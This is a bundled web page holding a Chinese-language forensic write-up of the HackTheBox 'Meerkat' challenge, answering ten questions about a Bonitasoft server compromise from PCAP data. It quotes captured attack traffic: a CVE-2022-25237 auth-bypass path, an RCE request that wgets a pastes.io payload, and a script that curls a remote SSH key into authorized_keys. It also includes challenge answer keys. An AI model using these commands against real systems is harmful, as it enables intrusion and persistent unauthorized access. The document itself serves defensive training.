"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[8297],{52920:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>o,contentTitle:()=>c,default:()=>h,frontMatter:()=>r,metadata:()=>a,toc:()=>l});const a=JSON.parse('{"id":"HackTheBox/Sherlocks/Meerkat/index","title":"Meerkat","description":"As a fast growing startup, Forela have been utilising a business management platform. Unfortunately our documentation is scarce and our administrators aren\'t the most security aware. As our new security provider we\'d like you to take a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.","source":"@site/docs/HackTheBox/Sherlocks/Meerkat/index.md","sourceDirName":"HackTheBox/Sherlocks/Meerkat","slug":"/HackTheBox/Sherlocks/Meerkat/","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Meerkat/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Sherlocks/Meerkat/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Logjammer","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Logjammer/"},"next":{"title":"Noted","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Noted/"}}');var s=t(74848),i=t(28453);const r={},c="Meerkat",o={},l=[{value:"\u9898\u76ee\u6570\u636e",id:"\u9898\u76ee\u6570\u636e",level:2},{value:"Task 1",id:"task-1",level:2},{value:"Task 2",id:"task-2",level:2},{value:"Task 3",id:"task-3",level:2},{value:"Task 4",id:"task-4",level:2},{value:"Task 5",id:"task-5",level:2},{value:"Task 6",id:"task-6",level:2},{value:"Task 7",id:"task-7",level:2},{value:"Task 8",id:"task-8",level:2},{value:"Task 9",id:"task-9",level:2},{value:"Task 10",id:"task-10",level:2}];function d(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"meerkat",children:"Meerkat"})}),"\n",(0,s.jsxs)(n.admonition,{title:"Sherlock Scenario",type:"info",children:[(0,s.jsx)(n.p,{children:"As a fast growing startup, Forela have been utilising a business management platform. Unfortunately our documentation is scarce and our administrators aren't the most security aware. As our new security provider we'd like you to take a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised."}),(0,s.jsx)(n.p,{children:"\u4f5c\u4e3a\u4e00\u4e2a\u5feb\u901f\u53d1\u5c55\u7684\u521d\u521b\u4f01\u4e1a\uff0cForela \u4e00\u76f4\u5728\u5229\u7528\u4e00\u4e2a\u5546\u4e1a\u7ba1\u7406\u5e73\u53f0\u3002\u4e0d\u5e78\u7684\u662f\uff0c\u6211\u4eec\u7684\u6587\u6863\u8d44\u6599\u6709\u9650\uff0c\u6211\u4eec\u7684\u7ba1\u7406\u5458\u4e5f\u4e0d\u592a\u91cd\u89c6\u5b89\u5168\u3002\u4f5c\u4e3a\u6211\u4eec\u7684\u65b0\u5b89\u5168\u670d\u52a1\u63d0\u4f9b\u5546\uff0c\u6211\u4eec\u5e0c\u671b\u4f60\u80fd\u770b\u4e00\u770b\u6211\u4eec\u5bfc\u51fa\u7684\u4e00\u4e9b PCAP \u548c\u65e5\u5fd7\u6570\u636e\uff0c\u786e\u8ba4\u6211\u4eec\u662f\u5426\u53d7\u5230\u4e86\uff08\u6216\u8005\u6ca1\u6709\u53d7\u5230\uff09\u4fb5\u5bb3\u3002"})]}),"\n",(0,s.jsx)(n.h2,{id:"\u9898\u76ee\u6570\u636e",children:"\u9898\u76ee\u6570\u636e"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{target:"_blank","data-noBrokenLinkCheck":!0,href:t(60938).A+"",children:"meerkat.zip"})}),"\n",(0,s.jsx)(n.h2,{id:"task-1",children:"Task 1"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u6211\u4eec\u76f8\u4fe1\u6211\u4eec\u7684\u5546\u4e1a\u7ba1\u7406\u5e73\u53f0\u670d\u52a1\u5668\u5df2\u7ecf\u906d\u5230\u4e86\u5165\u4fb5\u3002\u8bf7\u786e\u8ba4\u6b63\u5728\u8fd0\u884c\u7684\u5e94\u7528\u7a0b\u5e8f\u540d\u79f0\u3002"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u6d41\u91cf\u5305\u4e2d\uff0c\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u8fdb\u884c\u7b5b\u9009"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"(ip.dst == 172.31.6.44 || ip.src==172.31.6.44) && http\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5728 url \u90e8\u5206\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4efd\u5b57\u7b26\u4e32"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"bonita\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u7ecf\u8fc7\u641c\u7d22\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u8fd9\u4e2a ",(0,s.jsx)(n.code,{children:"bonitasoft"})," \u8fd9\u4e2a\u5e73\u53f0"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"bonitasoft\n"})}),"\n",(0,s.jsx)(n.h2,{id:"task-2",children:"Task 2"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u6211\u4eec\u76f8\u4fe1\u653b\u51fb\u8005\u53ef\u80fd\u4f7f\u7528\u4e86\u66b4\u529b\u7834\u89e3\u653b\u51fb\u7c7b\u522b\u7684\u5b50\u96c6 - \u6240\u8fdb\u884c\u7684\u653b\u51fb\u540d\u79f0\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u67e5\u770b\u540e\u7eed\u7684\u4e00\u4e9b http \u5305\uff0c\u53ef\u4ee5\u53d1\u73b0\u4ea7\u751f\u4e86\u5927\u91cf\u5931\u8d25\u7684\u767b\u5f55\u8bf7\u6c42\uff0c\u53ef\u4ee5\u6000\u7591\u653b\u51fb\u8005\u6b63\u5728\u5c1d\u8bd5\u8fdb\u884c\u51ed\u636e\u7206\u7834"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"Credential Stuffing\n"})}),"\n",(0,s.jsx)(n.h2,{id:"task-3",children:"Task 3"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u88ab\u5229\u7528\u7684\u6f0f\u6d1e\u662f\u5426\u6709 CVE \u7f16\u53f7 - \u5982\u679c\u6709\uff0c\u662f\u54ea\u4e00\u4e2a\uff1f"}),"\n"]}),"\n",(0,s.jsxs)(n.admonition,{type:"note",children:[(0,s.jsx)(n.p,{children:"\u4e3a\u4e86\u5206\u6790\u65b9\u4fbf\uff0c\u8fd9\u91cc\u5c06"}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"(ip.dst == 172.31.6.44 || ip.src==172.31.6.44) && http\n"})}),(0,s.jsx)(n.p,{children:"\u7b5b\u9009\u5668\u5f97\u5230\u7684\u5206\u7ec4\u7ed3\u679c\u5bfc\u51fa\u4e3a\u65b0\u7684 pcap \u6587\u4ef6\uff0c\u518d\u8fdb\u884c\u5206\u6790"}),(0,s.jsx)(n.p,{children:"\u53ef\u80fd\u4f1a\u5bfc\u81f4 tcp \u6d41\u7684\u7f16\u53f7\u4e0e\u539f\u59cb pcap \u5305\u4e0d\u4e00\u81f4"})]}),"\n",(0,s.jsx)(n.p,{children:"\u6839\u636e\u540e\u7eed\u7684\u6d41\u91cf\uff0c\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u8005\u767b\u9646\u6210\u529f\u540e POST \u5f62\u5f0f\u53d1\u9001\u4e86\u4e00\u4e2a zip \u6587\u4ef6"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"wireshark POST zip",src:t(86340).A+"",width:"1234",height:"1033"})}),"\n",(0,s.jsx)(n.p,{children:"\u5e76\u4e14\u540e\u7eed\u8fdb\u884c\u4e86\u5229\u7528"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"wireshark POST zip \u6f0f\u6d1e\u5229\u7528",src:t(14407).A+"",width:"1234",height:"1033"})}),"\n",(0,s.jsxs)(n.p,{children:["\u6839\u636e\u6240\u5f97\u5230\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230 ",(0,s.jsx)(n.code,{children:"CVE-2022-25237"})," \u8fd9\u4e2a\u6f0f\u6d1e\u7f16\u53f7"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"CVE-2022-25237\n"})}),"\n",(0,s.jsx)(n.h2,{id:"task-4",children:"Task 4"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u653b\u51fb\u8005\u7684\u5229\u7528\u662f\u901a\u8fc7\u5728 API URL \u8def\u5f84\u4e0a\u9644\u52a0\u4e86\u54ea\u4e2a\u5b57\u7b26\u4e32\u6765\u7ed5\u8fc7\u6388\u6743\u8fc7\u6ee4\u5668\u7684\uff1f"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u5c06\u653b\u51fb\u8005\u8bbf\u95ee\u7684 api url \u8bf7\u6c42\u8fdb\u884c\u63d0\u53d6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"/bonita/API/portal/page/;i18ntranslation\n/bonita/API/extension/rce?p=0&c=1&cmd=bash%20bx5gcr0et8\n/bonita/API/portal/page/133;i18ntranslation\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u53ef\u4ee5\u5206\u6790\u51fa\u5b57\u7b26\u4e32\u4e3a ",(0,s.jsx)(n.code,{children:"i18ntranslation"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"i18ntranslation\n"})}),"\n",(0,s.jsx)(n.h2,{id:"task-5",children:"Task 5"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u5728\u51ed\u8bc1\u586b\u5145\u653b\u51fb\u4e2d\u4f7f\u7528\u4e86\u591a\u5c11\u7ec4\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u7ec4\u5408\uff1f"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:'\u7b80\u5355\u7edf\u8ba1\u4e00\u4e0b http POST url=="/bonita/loginservice" status_code==204 \u7684\u8bf7\u6c42\u5373\u53ef'}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"56\n"})}),"\n",(0,s.jsx)(n.h2,{id:"task-6",children:"Task 6"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u54ea\u4e2a\u7528\u6237\u540d\u548c\u5bc6\u7801\u7ec4\u5408\u6210\u529f\u4e86\uff1f"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u67e5\u770b\u51ed\u636e\u7206\u7834\u7684\u6700\u540e\u4e00\u6b21\u8bf7\u6c42"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"POST /bonita/loginservice HTTP/1.1\nHost: forela.co.uk:8080\nUser-Agent: python-requests/2.28.1\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nCookie: x=x\nContent-Length: 59\n\nusername=seb.broom@forela.co.uk&password=g0vernm3nt&_l=enHTTP/1.1 204\nSet-Cookie: bonita.tenant=1; SameSite=Lax\nSet-Cookie: JSESSIONID=772FE3C83B1A0815EC3AFA1C098B40E9; Path=/bonita; HttpOnly; SameSite=Lax\nSet-Cookie: X-Bonita-API-Token=d350c469-2660-4504-9bea-4dbfa41ed9a4; Path=/bonita; SameSite=Lax\nSet-Cookie: BOS_Locale=en; Path=/; SameSite=Lax\nDate: Thu, 19 Jan 2023 15:39:17 GMT\nKeep-Alive: timeout=20\nConnection: keep-alive\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"username: seb.broom@forela.co.uk\npassword: g0vernm3nt\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"seb.broom@forela.co.uk:g0vernm3nt\n"})}),"\n",(0,s.jsx)(n.h2,{id:"task-7",children:"Task 7"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u5982\u679c\u6709\u7684\u8bdd\uff0c\u653b\u51fb\u8005\u4f7f\u7528\u4e86\u54ea\u4e2a\u6587\u672c\u5206\u4eab\u7f51\u7ad9\uff1f"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u6d41\u91cf\u4e2d\uff0c\u53d1\u73b0\u8fd9\u4e48\u4e00\u4e2a\u4f1a\u8bdd"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintxt",children:'GET /bonita/API/extension/rce?p=0&c=1&cmd=wget https://pastes.io/raw/bx5gcr0et8 HTTP/1.1\nHost: forela.co.uk:8080\nUser-Agent: python-requests/2.28.1\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nCookie: JSESSIONID=745EE4F7243DA99264F07781FBB9B4E3; X-Bonita-API-Token=1ccb3fac-8abd-4cc0-a52e-bb5811198cdf; bonita.tenant=1; BOS_Locale=en\n\nHTTP/1.1 200\nCache-Control: no-store, no-cache, must-revalidate, proxy-revalidate\nDate: Thu, 19 Jan 2023 15:38:53 GMT\nAccept-Ranges: bytes\nServer: Restlet-Framework/2.3.12\nContent-Type: application/json;charset=UTF-8\nContent-Length: 544\nKeep-Alive: timeout=20\nConnection: keep-alive\n\n{"p":"0","c":"1","cmd":"wget https://pastes.io/raw/bx5gcr0et8","out":"--2023-01-19 15:38:52--  https://pastes.io/raw/bx5gcr0et8\\nResolving pastes.io (pastes.io)... 66.29.132.145\\nConnecting to pastes.io (pastes.io)|66.29.132.145|:443... connected.\\nHTTP request sent, awaiting response... 200 OK\\nLength: 113 [text/plain]\\nSaving to: \\u2018bx5gcr0et8\\u2019\\n\\n     0K                                                       100% 57.8M=0s\\n\\n2023-01-19 15:38:53 (57.8 MB/s) - \\u2018bx5gcr0et8\\u2019 saved [113/113]\\n\\n","currentDate":"2023-01-19"}\n'})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"pastes.io\n"})}),"\n",(0,s.jsx)(n.h2,{id:"task-8",children:"Task 8"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u8bf7\u63d0\u4f9b\u653b\u51fb\u8005\u7528\u4e8e\u5728\u6211\u4eec\u4e3b\u673a\u4e0a\u83b7\u5f97\u6301\u4e45\u6027\u7684\u516c\u94a5\u6587\u4ef6\u540d\u3002"}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u5bf9\u4e0a\u6587\u6d41\u91cf\u4e2d\u4f7f\u7528\u7684\u8fdc\u7a0b\u8f7d\u8377 ",(0,s.jsx)(n.code,{children:"https://pastes.io/raw/bx5gcr0et8"})," \u4e0b\u8f7d\u4e0b\u6765\u8fdb\u884c\u5206\u6790"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",metastring:'title="https://pastes.io/raw/bx5gcr0et8"',children:"#!/bin/bash\ncurl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys\nsudo service ssh restart\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"hffgra4unv\n"})}),"\n",(0,s.jsx)(n.h2,{id:"task-9",children:"Task 9"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u60a8\u80fd\u786e\u8ba4\u653b\u51fb\u8005\u4fee\u6539\u7684\u6587\u4ef6\u4ee5\u83b7\u53d6\u6301\u4e45\u6027\u5417\uff1f"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u4e0a\u6587\u7684\u8f7d\u8377\u4e2d\u5c31\u6709"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"/home/ubuntu/.ssh/authorized_keys\n"})}),"\n",(0,s.jsx)(n.h2,{id:"task-10",children:"Task 10"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u60a8\u80fd\u786e\u8ba4\u8fd9\u79cd\u6301\u4e45\u6027\u673a\u5236\u7684 MITRE \u6280\u672f ID \u5417\uff1f"}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["Google Search: ",(0,s.jsx)(n.code,{children:"MITRE technique authorized_keys"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"T1098.004\n"})})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},60938:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/files/meerkat-285c249dd8cdf0292f3fa674e9f012b7.zip"},86340:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20231205-160549-4d43d66a589694c1273a8586318e0183.png"},14407:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/image_20231206-160635-4ba84eb70cd9d6baf4a5a55c03025300.png"},28453:(e,n,t)=>{t.d(n,{R:()=>r,x:()=>c});var a=t(96540);const s={},i=a.createContext(s);function r(e){const n=a.useContext(i);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:r(e.components),a.createElement(i.Provider,{value:n},e.children)}}}]);